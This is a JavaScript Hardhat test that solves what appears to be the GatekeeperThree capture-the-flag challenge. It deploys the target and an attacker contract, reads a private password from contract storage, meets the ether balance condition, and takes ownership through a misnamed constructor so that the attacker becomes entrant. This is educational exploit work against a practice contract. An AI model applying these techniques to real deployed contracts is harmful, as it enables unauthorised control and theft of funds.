import { expect } from "chai";
import { ethers } from "hardhat";

describe("GatekeeperThree", async function () {

  it("Should complete the function with no error", async function () {
    const [deployer, attacker] = await ethers.getSigners()
    const GatekeeperThree = await ethers.getContractFactory("GatekeeperThree");
    const gatekeeperThree = await GatekeeperThree.deploy();
    await gatekeeperThree.deployed();

    const GatekeeperThreeAttacker = await ethers.getContractFactory("GatekeeperThreeAttacker");
    const gatekeeperThreeAttacker = await GatekeeperThreeAttacker.connect(attacker).deploy(gatekeeperThree.address);

    await gatekeeperThreeAttacker.deployed();

    await gatekeeperThree.connect(attacker).createTrick()

    const simpleTrickAddr = await gatekeeperThree.trick()

    // const simpleTrick = await ethers.getContractAt("SimpleTrick", simpleTrickAddr)
    const password = await ethers.provider.getStorageAt(simpleTrickAddr, 2)
    expect(await gatekeeperThree.allow_enterance()).to.be.eq(false)

    await gatekeeperThree.connect(attacker).getAllowance(password)

    expect(await gatekeeperThree.allow_enterance()).to.be.eq(true)

    //transferimos para pasar el tercer gate
    await attacker.sendTransaction({ to: gatekeeperThree.address, value: ethers.utils.parseEther("0.0011") })
    console.log(await gatekeeperThree.entrant())
    await gatekeeperThreeAttacker.callConstruct0r();

    await gatekeeperThreeAttacker.callEnter()
    const entrant = await gatekeeperThree.entrant()
    expect(entrant).to.be.eq(attacker.address)

  });

});


// sendTransaction({
//   from: '0xD4CE7BF9548faa57d2bA7ae0e343fAE478960aCb',
//   to: '0x978fc9DF8cac472C40B605A939c7DF19D680d4c0',
//   value: '01100000000000000',
// })
